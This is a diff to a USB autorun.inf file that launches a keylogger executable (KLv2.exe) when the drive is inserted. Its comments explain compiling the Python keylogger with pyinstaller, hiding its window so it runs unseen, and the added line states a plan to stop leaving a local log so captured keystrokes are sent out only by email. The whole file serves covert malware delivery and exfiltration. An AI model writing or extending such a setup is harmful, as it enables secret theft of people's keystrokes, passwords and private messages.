@@ -3,6 +3,7 @@
 #Py script must be converted to an exe file, use pyinstaller or py2exe
 #Save as .inf file, place into root directory of USB drive
 #Can alter keylogger to use win32gui so there isn't a pop up window and runs in the background
+#There will be a log file that is placed in the USB root directory, working on removing this so it's only sent via email.
 
 [autorun] 
 open=KLv2.exe 
